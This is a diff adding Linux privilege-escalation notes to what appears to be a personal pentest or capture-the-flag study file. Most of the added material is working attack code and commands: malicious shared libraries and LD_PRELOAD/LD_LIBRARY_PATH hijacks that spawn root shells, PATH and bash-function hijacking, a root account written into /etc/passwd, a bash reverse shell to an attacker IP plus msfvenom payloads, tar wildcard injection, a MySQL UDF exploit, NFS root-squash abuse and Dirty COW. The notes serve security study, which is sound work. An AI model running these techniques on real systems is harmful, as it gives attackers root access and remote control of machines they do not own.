@@ -1,5 +1,9 @@
 = Linux
 
+== Path
+
+* /dev/shm: temporary file storage (tmpfs) that uses RAM for the storage
+
 == Shell Operators
 |===
 |Symbol/Operator |Description
@@ -93,3 +97,499 @@ Right-hand command will only run if left-hand command is successful.
 |===
 
 https://crontab-generator.org/[crontab-generator.org] or https://crontab.guru/[crontab.guru]
+
+== /etc/shadow
+Password hashes are stored in this file, only visible by root normally. Other info in this file: date of last password change, password expiration, ...
+
+To crack the hashes and John the ripper, we need to combine this file with /etc/passwd.
+
+== Privilege Escalation
+Horizontal privsec: from normal user to another normal user. That could be what we want if that other user has a SUID file attached to their home directory.
+
+Vertical privsec: from normal user to root
+
+=== SUID/GUID
+File with SUID bit set => file or files can be run with the permissions of the file(s) owner. GUID, with the group.
+
+* u = user; g = group; o = other
+* read = r = 4
+* write = w = 2
+* execute = x = 1
+
+But when special permission is given to each user it becomes SUID or SGID. When extra bit “4” is set to user(Owner) it becomes SUID (Set user ID) and when bit “2” is set to group it becomes SGID (Set Group ID).
+
+`chmod 4755 script.sh`
+
+Permissions to look for:
+
+`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null` or `find / -user root -perm -4000 -exec ls -ldb {} \;`
+
+This kind of file is only exploitable if we can supply it an argument for command injection. If the SUID binary just execute "ps", we can't do anything with it.
+
+==== Known exploits
+Look for SUID binaries that can be exploited in https://www.exploit-db.com/[Exploit DB]
+
+==== Shared object injection
+Use strace on the executable to see open/access calls and "no such file" errors.
+
+`strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`
+
+[source, bash]
+----
+user@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY)      = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libdl.so.2", O_RDONLY)       = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libm.so.6", O_RDONLY)        = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libc.so.6", O_RDONLY)        = 3
+open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
+----
+
+Create missing directory and add our own libcalc.so that spawns a shell.
+
+libcalc.c
+[source, c]
+----
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+        setuid(0);
+        system("/bin/bash -p");
+}
+----
+
+`gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c`
+
+After compiling it, we can run suid-so again to get a root shell.
+
+==== Environment variables
+SUID binary is exploitable if inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.
+
+Use `strings` command to find string in executable.
+
+[source, bash]
+----
+user@debian:~$ strings /usr/local/bin/suid-env
+/lib64/ld-linux-x86-64.so.2
+5q;Xq
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+service apache2 start
+----
+The executable service could be replaced by our own to get a shell as root.
+
+service.c
+[source, c]
+----
+int main() {
+        setuid(0);
+        system("/bin/bash -p");
+}
+----
+Compile it as "service" and execute
+
+`PATH=.:$PATH /usr/local/bin/suid-env`
+
+
+==== Abusing shell features
+Sometimes, old version of a shell are exploitable like bash < 4.2-048.
+
+Even if the absolute path is used, we can create a bash function that will be used instead of the binary at the absolute path.
+
+[source, bash]
+----
+user@debian:~$ strings /usr/local/bin/suid-env2
+[...]
+/usr/sbin/service apache2 start
+
+user@debian:~$ /bin/bash --version
+GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
+
+user@debian:~$ function /usr/sbin/service { /bin/bash -p; }
+user@debian:~$ export -f /usr/sbin/service
+
+user@debian:~$ /usr/local/bin/suid-env2
+user@debian:~#
+----
+
+The function that loads a bash and preserve permissions with `-p` is used instead of the executable service.
+
+For bash versions < 4.4, we can use debugging mode.
+
+When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements. Use it to embed a command which creates an SUID version of /bin/bash
+
+`env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2`
+
+Now execute `/tmp/rootbash -p` to get a root shell.
+
+=== Exploiting writeable /etc/passwd
+Group with gid 0 is root group. Useful to find user on the system who can edit /etc/passwd. With that access, we can create a root user that we can access.
+
+7 fields in /etc/passwd where an entry looks like this
+
+`test:x:0:0:root:/root:/bin/bash`
+
+. Username: between 1 and 32 char length
+. Password: 'x' indicates password is stored in /etc/shadow. Need "passwd" command to compute the hash
+. User ID: 0 for root, 1-99 are reserved for other predefined accounts, 100-999 are reserved by system for admin and system accounts/groups
+. Group ID: primary group ID stored in /etc/group file
+. User ID info: full name, phone number, ...
+. Home directory: if directory doesn't exist, it becomes /
+. Command/shell: absolute path of shell but it doesn't have to be a shell
+
+Create a user, add the hash and put 0 for UID/GID to give root access.
+
+[source, bash]
+----
+openssl passwd -1 -salt [salt] [password]
+----
+Result with salt=new and password=123 below.
+
+Create the entry in /etc/passwd
+
+`new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash`
+
+=== Exploiting readable/writeable /etc/shadow
+The /etc/shadow file contains user password hashes and is usually readable only by the root user.
+
+If /etc/shadow is world readable, we can extract hashed password and try to crack them with John the ripper.
+
+If /etc/shadow is writeable, we can just replace root password with our hash
+
+`mkpasswd -m sha-512 newpasswordhere`
+
+=== Escaping Vi Editor
+Execute `sudo -l` to list what commands we are able to use as a super user on that account.
+
+The output is something like that
+
+[source, bash]
+----
+user8@polobox:/home/user3$ sudo -l
+User user8 may run the following commands on polobox:
+    (root) NOPASSWD: /usr/bin/vi
+----
+
+We just need to do `sudo vi` then `:!sh` to get a shell prompt as root.
+
+Check https://gtfobins.github.io/[GTFOBins] for list of Unix Binaries that can be exploited to bypass local security restrictions.
+
+=== Exploiting CRON
+CRON tasks are written in /etc/crontab, executed by CRON daemon (root).
+
+Format of a cronjob:
+
+`17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly`
+
+* # = ID
+* m = minute
+* h = hour
+* dom = day of the month
+* mon = month
+* dow = day of the week
+* user = what user the command will run
+* command = what command should be run
+
+==== File permissions of command
+Check for scripts executed as root where we have write access. The task is then to create a command that will return a shell and paste it in this file. When the file runs again, the shell will be running as root.
+
+[source, bash]
+----
+#!/bin/bash
+bash -i >& /dev/tcp/{our attacker ip}/4444 0>&1
+----
+
+Then use `nc -lvnp 4444` ou our attacker box and wait for the script to be executed.
+
+==== PATH env variable
+For this to work, we need to have a directory that we can write into in the PATH and a command without the absolute path like `* * * * * root overwrite.sh`
+
+If the file overwrite.sh is found in /usr/local/bin/overwrite.sh, we also need the directory where we can write into to be before /usr/local/bin
+
+`PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`
+
+We can just create a file overwrite.sh in /home/user/overwrite.sh and this will be picked up before the one in /usr/local/bin.
+
+/home/user/overwrite.sh
+[source, bash]
+----
+#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+----
+
+This script will be executed as root, will copy bash in /tmp/rootbash and set the SUID bit. We can then execute /tmp/rootbash after the script has run to get a shell as root.
+
+==== Wildcards
+For example, if the tar command is being run with a wildcard.
+
+/usr/local/bin/compress.sh
+[source, bash]
+----
+#!/bin/sh
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+----
+
+If we look at https://gtfobins.github.io/gtfobins/tar/[GTFObins - tar], we can see that there is a checkpoint feature where we can execute a command.
+
+`tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
+
+We can create a payload that will be executed during the tar command.
+
+`msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf -o shell.elf`
+
+Copy it on the path that is being picked up by tar.
+
+`scp shell.elf user@10.10.239.231:~`
+
+We then need to create two files that will act as parameters for tar.
+
+[source, bash]
+----
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+----
+
+This is because when the command is run, * will expand to include these files which are valid tar command line options. We just need to set up a listener on our attacker machine and wait `nc -lvnp 4444`
+
+=== Exploiting PATH variable
+Environment variable that specifies directories that hold executable programs.
+
+We can exploit that by rewriting the PATH variable to a location of our choosing. So when the SUID binary calls the system shell to run an executable, it runs one that we've written instead.
+
+`echo "[whatever command we want to run]" > [name of the executable we're imitating]` if the binary with SUID calls `ls`, that's the name we will put as file name.
+
+Go to /tmp and create the fake "ls" binary. In this example /home/user5/script has SUID bit set and executes ls command.
+
+[source, bash]
+----
+cd /tmp
+echo "/bin/bash" > ls
+chmod +x ls
+export PATH=/tmp:$PATH
+cd /home/user5
+./script
+----
+
+When executing ./script (SUID), it looks for "ls" in the PATH which is found in /tmp since we put it first and execute our "ls" which calls bash as root because of the SUID.
+
+=== Service exploits
+If MySQL service is running as root without a password assigned, we can use an https://www.exploit-db.com/exploits/1518[exploit] that takes advantage of User Defined Functions to run system commands as root via the MySQL service
+
+Compile the exploit in /home/user/tools/mysql-udf
+
+[source, bash]
+----
+gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+----
+
+`mysql -u root` to connect to mysql service.
+
+[source, mysql]
+----
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+----
+
+Now, executing /tmp/rootbash will give us a shell as root.
+
+`/tmp/rootbash -p`
+
+=== sudo
+`sudo -l` to list programs which sudo allows the user to run.
+
+Find programs listed in https://gtfobins.github.io/[GTFObins] to see how to exploit that.
+
+==== Shell escape sequences
+If the program is listed with "sudo" as a function, we can use it to elevate privileges.
+
+Any program that allows us to type commands such as "!/bin/sh" will get us a shell as root if we launched the initial command with sudo (iftop, vim, ...).
+
+==== Environment variables
+sudo can be configured to inherit certain environment variables from the user's environment. Look for env_keep.
+
+[source, bash]
+----
+user@debian:~$ sudo -l
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+----
+
+* LD_PRELOAD loads a shared object before any others when a program is run.
+* LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.
+
+Similar to PATH, we can create our own library to exploit LD_PRELOAD.
+
+preload.c
+[source, c]
+----
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+        unsetenv("LD_PRELOAD");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+
+----
+
+[source, bash]
+----
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+sudo LD_PRELOAD=/tmp/preload.so program-name-here
+----
+
+A root shell should spawn. Run ldd against the apache2 program to see which shared libraries are used by the program. We need to find one that we can replace.
+
+[source, bash]
+----
+user@debian:~$ ldd /usr/sbin/apache2
+        linux-vdso.so.1 =>  (0x00007fff881bc000)
+        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f60191d2000)
+        libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f6018fae000)
+        libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f6018d74000)
+        libpthread.so.0 => /lib/libpthread.so.0 (0x00007f6018b58000)
+        libc.so.6 => /lib/libc.so.6 (0x00007f60187ec000)
+        libuuid.so.1 => /lib/libuuid.so.1 (0x00007f60185e7000)
+        librt.so.1 => /lib/librt.so.1 (0x00007f60183df000)
+        libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f60181a8000)
+        libdl.so.2 => /lib/libdl.so.2 (0x00007f6017fa3000)
+        libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f6017d7b000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007f601968f000)
+----
+
+library_path.c
+[source, c]
+----
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        unsetenv("LD_LIBRARY_PATH");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+----
+
+Compile library_path and create shared library libcrypt.so.1
+[source, bash]
+----
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+sudo LD_LIBRARY_PATH=/tmp apache2
+----
+
+=== Password & Keys
+
+==== History files
+Check the history for password in them.
+
+`cat ~/.*history | less`
+
+==== Config files
+Config files often contains passwords in plaintext or other reversible formats. Check directories that can be accessed.
+
+Check /etc or $HOME for readable files where password could be stored.
+
+==== SSH keys
+Look for hidden backup folders that could have wrong permissions (readable by all).
+
+`ls -la /`
+
+They might contain passwords or ssh keys.
+
+If there is an SSH key for root, try to connect as root on the machine using it.
+
+`ssh -i root_key root@localhost`
+
+=== NFS
+Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
+
+`cat /etc/exports`
+
+[source, bash]
+----
+user@debian:~$ cat /etc/exports
+# /etc/exports: the access control list for filesystems which may be exported
+#               to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+
+#/tmp *(rw,sync,insecure,no_subtree_check)
+----
+
+/tmp has root squashing disabled. On our attacker box, login as root and create a shell with msfvenom with SUID bit set, copy it on the NFS after mounting it. Since it is root, the permissions will be kept on the NFS in /tmp. A simple user can then execute it and get root shell.
+
+[source, bash]
+----
+sudo su
+mkdir /tmp/nfs
+mount -t nfs -o rw,vers=3 target_ip:/tmp /tmp/nfs
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+chmod +xs /tmp/nfs/shell.elf
+----
+
+Then on the target machine, execute /tmp/shell.elf to get root shell.
+
+=== Kernel exploits
+Kernel exploits can leave the system in an unstable state, which is why we should only run them as a last resort.
+
+Run perl script linux-exploit-suggester-2 from https://github.com/jondonas/linux-exploit-suggester-2[Github] on the target machine to see what could work.
+
+The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at /home/user/tools/kernel-exploits/dirtycow/c0w.c. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).
+
+[source, bash]
+----
+gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+./c0w
+
+/usr/bin/passwd
+----
+
+to get a root shell.
+
+=== Checklist
+* https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md[Github - checklist privesc]
+* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md[Github - payloadallthethings privesc]
+* https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html[OSCP guide - privesc]
+* https://payatu.com/guide-linux-privilege-escalation[Blog payatu]
